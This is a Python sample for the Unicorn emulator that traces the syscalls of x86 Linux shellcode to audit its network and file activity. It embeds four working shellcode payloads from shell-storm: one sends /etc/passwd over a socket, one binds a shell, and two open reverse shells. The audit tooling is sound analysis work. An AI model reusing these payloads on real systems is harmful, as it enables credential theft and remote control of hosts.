#!/usr/bin/env python
# Unicorn sample for auditing network connection and file handling in shellcode.
# Nguyen Tan Cong <shenlongbk@gmail.com>

from __future__ import print_function
from unicorn import *
from unicorn.x86_const import *
import struct
import uuid

SIZE_REG = 4
SOCKETCALL_MAX_ARGS = 3

SOCKET_TYPES = {
    1: "SOCK_STREAM",
    2: "SOCK_DGRAM",
    3: "SOCK_RAW",
    4: "SOCK_RDM",
    5: "SOCK_SEQPACKET",
    10: "SOCK_PACKET"
}

ADDR_FAMILY = {
    0: "AF_UNSPEC",
    1: "AF_UNIX",
    2: "AF_INET",
    3: "AF_AX25",
    4: "AF_IPX",
    5: "AF_APPLETALK",
    6: "AF_NETROM",
    7: "AF_BRIDGE",
    8: "AF_AAL5",
    9: "AF_X25",
    10: "AF_INET6",
    12: "AF_MAX"
}

# http://shell-storm.org/shellcode/files/shellcode-861.php
X86_SEND_ETCPASSWD = b"\x6a\x66\x58\x31\xdb\x43\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x68\x7f\x01\x01\x01\x66\x68\x30\x39\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x89\xc6\x6a\x01\x59\xb0\x3f\xcd\x80\xeb\x27\x6a\x05\x58\x5b\x31\xc9\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x31\xd2\xb6\xff\xb2\xff\xcd\x80\x89\xc2\x6a\x04\x58\xb3\x01\xcd\x80\x6a\x01\x58\x43\xcd\x80\xe8\xd4\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"

# http://shell-storm.org/shellcode/files/shellcode-882.php
X86_BIND_TCP = b"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"

# http://shell-storm.org/shellcode/files/shellcode-883.php
X86_REVERSE_TCP = b"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

# http://shell-storm.org/shellcode/files/shellcode-849.php
X86_REVERSE_TCP_2 = b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x31\xdb\xb3\x02\x68\xc0\xa8\x01\x0a\x66\x68\x7a\x69\x66\x53\xfe\xc3\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80"

# memory address where emulation starts
ADDRESS = 0x1000000


# supported classes
class IdGenerator:
    def __init__(self):
        self.__next_id = 3  # exclude sdtin, stdout, stderr

    def next(self):
        next_id = self.__next_id

        self.__next_id += 1

        return next_id


class LogChain:
    def __init__(self):
        self.__chains = {}
        self.__linking_fds = {}

    def clean(self):
        self.__chains = {}
        self.__linking_fds = {}

    def create_chain(self, my_id):
        if not my_id in self.__chains:
            self.__chains[my_id] = []
        else:
            print("LogChain: id %d existed" % my_id)

    def add_log(self, id, msg):
        fd = self.get_original_fd(id)

        if fd is not None:
            self.__chains[fd].append(msg)
        else:
            print("LogChain: id %d doesn't exist" % id)

    def link_fd(self, from_fd, to_fd):
        if not to_fd in self.__linking_fds:
            self.__linking_fds[to_fd] = []

        self.__linking_fds[to_fd].append(from_fd)

    def get_original_fd(self, fd):
        if fd in self.__chains:
            return fd

        for orig_fd, links in self.__linking_fds.items():
            if fd in links:
                return orig_fd

        return None

    def print_report(self):
        print("""
----------------
| START REPORT |
----------------
""")

        for my_id, logs in self.__chains.items():
            print("---- START FD(%d) ----" % my_id)
            print("\n".join(logs))
            print("---- END FD(%d) ----" % my_id)

        print("""
--------------
| END REPORT |
--------------
""")


# end supported classes


# utilities
def bin_to_ipv4(ip):
    return "%d.%d.%d.%d" % (
        (ip & 0xff000000) >> 24,
        (ip & 0xff0000) >> 16,
        (ip & 0xff00) >> 8,
        (ip & 0xff))


def read_string(uc, addr):
    ret = ""

    c = uc.mem_read(addr, 1)[0]
    read_bytes = 1

    while c != 0x0:
        ret += chr(c)
        c = uc.mem_read(addr + read_bytes, 1)[0]
        read_bytes += 1

    return ret


def parse_sock_address(sock_addr):
    sin_family, = struct.unpack("<h", sock_addr[:2])

    if sin_family == 2:  # AF_INET
        port, host = struct.unpack(">HI", sock_addr[2:8])
        return "%s:%d" % (bin_to_ipv4(host), port)
    elif sin_family == 6:  # AF_INET6
        return ""


def print_sockcall(msg):
    print(">>> SOCKCALL %s" % msg)


# end utilities

# callback for tracing instructions
def hook_code(uc, address, size, user_data):
    print(">>> Tracing instruction at 0x%x, instruction size = 0x%x" % (address, size))
    # read this instruction code from memory
    tmp = uc.mem_read(address, size)
    print(">>> Instruction code at [0x%x] =" % (address), end="")
    for i in tmp:
        print(" %x" % i, end="")
    print("")


# callback for tracing Linux interrupt
def hook_intr(uc, intno, user_data):
    global id_gen

    # only handle Linux syscall
    if intno != 0x80:
        return

    eax = uc.reg_read(UC_X86_REG_EAX)
    ebx = uc.reg_read(UC_X86_REG_EBX)
    ecx = uc.reg_read(UC_X86_REG_ECX)
    edx = uc.reg_read(UC_X86_REG_EDX)
    eip = uc.reg_read(UC_X86_REG_EIP)

    # print(">>> INTERRUPT %d" % eax)

    if eax == 1:  # sys_exit
        print(">>> SYS_EXIT")
        uc.emu_stop()
    elif eax == 3:  # sys_read
        fd = ebx
        buf = ecx
        count = edx

        dummy_content = str(uuid.uuid1())[:32]
        if len(dummy_content) > count:
            dummy_content = dummy_content[:count]

        uc.mem_write(buf, dummy_content)

        msg = "read %d bytes from fd(%d) with dummy_content(%s)" % (count, fd, dummy_content)

        fd_chains.add_log(fd, msg)
        print(">>> %s" % msg)
    elif eax == 4:  # sys_write
        fd = ebx
        buf = ecx
        count = edx

        content = uc.mem_read(buf, count)

        msg = "write data=%s count=%d to fd(%d)" % (content, count, fd)

        print(">>> %s" % msg)
        fd_chains.add_log(fd, msg)
    elif eax == 5:  # sys_open
        filename_addr = ebx
        flags = ecx
        mode = edx
        filename = read_string(uc, filename_addr)

        dummy_fd = id_gen.next()
        uc.reg_write(UC_X86_REG_EAX, dummy_fd)

        msg = "open file (filename=%s flags=%d mode=%d) with fd(%d)" % (filename, flags, mode, dummy_fd)

        fd_chains.create_chain(dummy_fd)
        fd_chains.add_log(dummy_fd, msg)
        print(">>> %s" % msg)
    elif eax == 11:  # sys_execv
        # print(">>> ebx=0x%x, ecx=0x%x, edx=0x%x" % (ebx, ecx, edx))
        filename = read_string(uc, ebx)

        print(">>> SYS_EXECV filename=%s" % filename)
    elif eax == 63:  # sys_dup2
        fd_chains.link_fd(ecx, ebx)
        print(">>> SYS_DUP2 oldfd=%d newfd=%d" % (ebx, ecx))
    elif eax == 102:  # sys_socketcall
        # ref: http://www.skyfree.org/linux/kernel_network/socket.html
        call = uc.reg_read(UC_X86_REG_EBX)
        args = uc.reg_read(UC_X86_REG_ECX)

        SOCKETCALL_NUM_ARGS = {
            1: 3,  # sys_socket
            2: 3,  # sys_bind
            3: 3,  # sys_connect
            4: 2,  # sys_listen
            5: 3,  # sys_accept
            9: 4,  # sys_send
            11: 4,  # sys_receive
            13: 2  # sys_shutdown
        }

        buf = uc.mem_read(args, SOCKETCALL_NUM_ARGS[call] * SIZE_REG)
        args = struct.unpack("<" + "I" * SOCKETCALL_NUM_ARGS[call], buf)

        # int sys_socketcall(int call, unsigned long *args)
        if call == 1:  # sys_socket
            # err = sys_socket(a0,a1,a[2])
            # int sys_socket(int family, int type, int protocol)
            family = args[0]
            sock_type = args[1]
            protocol = args[2]

            dummy_fd = id_gen.next()
            uc.reg_write(UC_X86_REG_EAX, dummy_fd)

            if family == 2:  # AF_INET 

                msg = "create socket (%s, %s) with fd(%d)" % (ADDR_FAMILY[family], SOCKET_TYPES[sock_type], dummy_fd)
                fd_chains.create_chain(dummy_fd)
                fd_chains.add_log(dummy_fd, msg)
                print_sockcall(msg)
            elif family == 3:  # AF_INET6
                pass

        elif call == 2:  # sys_bind
            fd = args[0]
            umyaddr = args[1]
            addrlen = args[2]

            sock_addr = uc.mem_read(umyaddr, addrlen)

            msg = "fd(%d) bind to %s" % (fd, parse_sock_address(sock_addr))
            fd_chains.add_log(fd, msg)
            print_sockcall(msg)

        elif call == 3:  # sys_connect
            # err = sys_connect(a0, (struct sockaddr *)a1, a[2])
            # int sys_connect(int fd, struct sockaddr *uservaddr, int addrlen)
            fd = args[0]
            uservaddr = args[1]
            addrlen = args[2]

            sock_addr = uc.mem_read(uservaddr, addrlen)
            msg = "fd(%d) connect to %s" % (fd, parse_sock_address(sock_addr))
            fd_chains.add_log(fd, msg)
            print_sockcall(msg)

        elif call == 4:  # sys_listen
            fd = args[0]
            backlog = args[1]

            msg = "fd(%d) listened with backlog=%d" % (fd, backlog)
            fd_chains.add_log(fd, msg)
            print_sockcall(msg)

        elif call == 5:  # sys_accept
            fd = args[0]
            upeer_sockaddr = args[1]
            upeer_addrlen = args[2]

            # print(">>> upeer_sockaddr=0x%x, upeer_addrlen=%d" % (upeer_sockaddr, upeer_addrlen))

            if upeer_sockaddr == 0x0:
                print_sockcall("fd(%d) accept client" % fd)
            else:
                upeer_len, = struct.unpack("<I", uc.mem_read(upeer_addrlen, 4))

                sock_addr = uc.mem_read(upeer_sockaddr, upeer_len)

                msg = "fd(%d) accept client with upeer=%s" % (fd, parse_sock_address(sock_addr))
                fd_chains.add_log(fd, msg)
                print_sockcall(msg)

        elif call == 9:  # sys_send
            fd = args[0]
            buff = args[1]
            length = args[2]
            flags = args[3]

            buf = uc.mem_read(buff, length)
            msg = "fd(%d) send data=%s" % (fd, buf)
            fd_chains.add_log(fd, msg)
            print_sockcall(msg)

        elif call == 11:  # sys_receive
            fd = args[0]
            ubuf = args[1]
            size = args[2]
            flags = args[3]

            msg = "fd(%d) is gonna receive data with size=%d flags=%d" % (fd, size, flags)
            fd_chains.add_log(fd, msg)
            print_sockcall(msg)

        elif call == 13:  # sys_shutdown
            fd = args[0]
            how = args[1]

            msg = "fd(%d) is shutted down because of %d" % (fd, how)
            fd_chains.add_log(fd, msg)
            print_sockcall(msg)


# Test X86 32 bit
def test_i386(code):
    global fd_chains

    fd_chains.clean()
    print("Emulate i386 code")
    try:
        # Initialize emulator in X86-32bit mode
        mu = Uc(UC_ARCH_X86, UC_MODE_32)

        # map 2MB memory for this emulation
        mu.mem_map(ADDRESS, 2 * 1024 * 1024)

        # write machine code to be emulated to memory
        mu.mem_write(ADDRESS, code)

        # initialize stack
        mu.reg_write(UC_X86_REG_ESP, ADDRESS + 0x200000)

        # tracing all instructions with customized callback
        # mu.hook_add(UC_HOOK_CODE, hook_code)

        # handle interrupt ourself
        mu.hook_add(UC_HOOK_INTR, hook_intr)

        # emulate machine code in infinite time
        mu.emu_start(ADDRESS, ADDRESS + len(code))

        # now print out some registers
        print(">>> Emulation done")

    except UcError as e:
        print("ERROR: %s" % e)

    fd_chains.print_report()


# Globals
fd_chains = LogChain()
id_gen = IdGenerator()

if __name__ == '__main__':
    test_i386(X86_SEND_ETCPASSWD)
    test_i386(X86_BIND_TCP)
    test_i386(X86_REVERSE_TCP)
    test_i386(X86_REVERSE_TCP_2)
